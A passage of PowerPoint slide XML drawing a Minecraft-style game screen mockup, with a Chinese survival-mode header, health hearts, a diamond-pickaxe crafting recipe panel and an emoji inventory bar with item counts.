                  <a:srgbClr val="CC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► 生存模式 · 硬核难度 · 第 1247 天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6293805" y="389991"/>
            <a:ext cx="2517522" cy="21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444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 ♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥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822301" y="605779"/>
            <a:ext cx="719292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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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10/10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="182" name="组合 181"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="839549"/>
            <a:ext cx="9144000" cy="5214866"/>
            <a:chOff x="0" y="839549"/>
            <a:chExt cx="9144000" cy="2247788"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="23" name="Shape 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="839549"/>
              <a:ext cx="9144000" cy="1798230"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="87CEEB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0" y="2637779"/>
              <a:ext cx="9144000" cy="179823"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="7EC850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0" y="2817602"/>
              <a:ext cx="9144000" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="8B5E3C"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="333333"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="183" name="组合 182"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="143858" y="983407"/>
            <a:ext cx="3596460" cy="3326724"/>
            <a:chOff x="143858" y="983407"/>
            <a:chExt cx="3506549" cy="2841204"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="27" name="Shape 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="539469" y="2044363"/>
              <a:ext cx="143858" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5C3D1E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359646" y="1792611"/>
              <a:ext cx="503504" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="4A7C3F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467540" y="1720681"/>
              <a:ext cx="287717" cy="143858"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5BA050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1798230" y="2134274"/>
              <a:ext cx="143858" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5C3D1E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1618407" y="1882522"/>
              <a:ext cx="503504" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="4A7C3F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32" name="Shape 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1726301" y="1810593"/>
              <a:ext cx="287717" cy="143858"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5BA050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>
              <a:off x="143858" y="983407"/>
              <a:ext cx="3506549" cy="1078938"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A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233770" y="1055336"/>
              <a:ext cx="3236814" cy="143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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF55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⚒ 合成配方 · 钒石陔</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="75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233770" y="1235159"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="40" name="Text 38"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="251752" y="1253142"/>
              <a:ext cx="287717" cy="2877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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>💎</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="12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575434" y="1235159"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42" name="Text 40"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="593416" y="1253142"/>
              <a:ext cx="287717" cy="2877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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>💎</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="120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917097" y="1235159"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="44" name="Text 42"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="935080" y="1253142"/>
              <a:ext cx="287717" cy="2877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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>💎</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="12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233770" y="1576823"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="46" name="Shape 44"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="575434" y="1576823"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="47" name="Text 45"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="593416" y="1594805"/>
              <a:ext cx="287717" cy="2877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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🪵</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="12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917097" y="1576823"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="49" name="Shape 47"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="233770" y="1918487"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="50" name="Shape 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="575434" y="1918487"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="Text 49"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="593416" y="1936469"/>
              <a:ext cx="287717" cy="2877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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🪵</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="12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917097" y="1918487"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="53" name="Text 51"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1294726" y="1558841"/>
              <a:ext cx="215788" cy="3236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AAAAA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►</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="54" name="Shape 52"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1528496" y="1397000"/>
              <a:ext cx="395611" cy="395611"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="6B6B6B"/>
            </a:solidFill>
            <a:ln w="19050">
              <a:solidFill>
                <a:srgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="55" name="Text 53"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1546478" y="1414982"/>
              <a:ext cx="359646" cy="35964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500" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>⛏️</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="15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233770" y="1882522"/>
              <a:ext cx="3326726" cy="1258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AAAAA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耐久度: 1561  |  附魔: 精准采集 III · 效率 V</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="57" name="Shape 55"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="143858" y="2134274"/>
              <a:ext cx="3506549" cy="611398"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="58" name="Text 56"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="233770" y="2206204"/>
              <a:ext cx="3236814" cy="143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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF55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🎒 当前背包</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="59" name="Shape 57"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="233770" y="2368044"/>
              <a:ext cx="323681" cy="323681"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="9B9B9B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60" name="Text 58"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="242761" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>⛏️</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="61" name="Text 59"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="413593" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="62" name="Shape 60"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="611398" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="63" name="Text 61"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="620389" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🗡️</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="64" name="Text 62"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="791221" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="65" name="Shape 63"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="989027" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="66" name="Text 64"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="998018" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🧱</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="67" name="Text 65"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1168850" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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64</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="68" name="Shape 66"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1366655" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="69" name="Text 67"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1375646" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🍖</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="70" name="Text 68"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1546478" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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32</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="71" name="Shape 69"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1744283" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="72" name="Text 70"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1753274" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>💣</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="73" name="Text 71"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1924106" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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16</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="74" name="Shape 72"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2121912" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="75" name="Text 73"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2130903" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🪣</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="76" name="Text 74"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2301735" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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3</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="77" name="Shape 75"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2499540" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="78" name="Text 76"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2508531" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🏹</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="79" name="Text 77"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2679363" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="Shape 78"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2877168" y="2368044"/>
              <a:ext cx="323681" cy="323681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rgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="81" name="Text 79"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2886159" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🔦</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
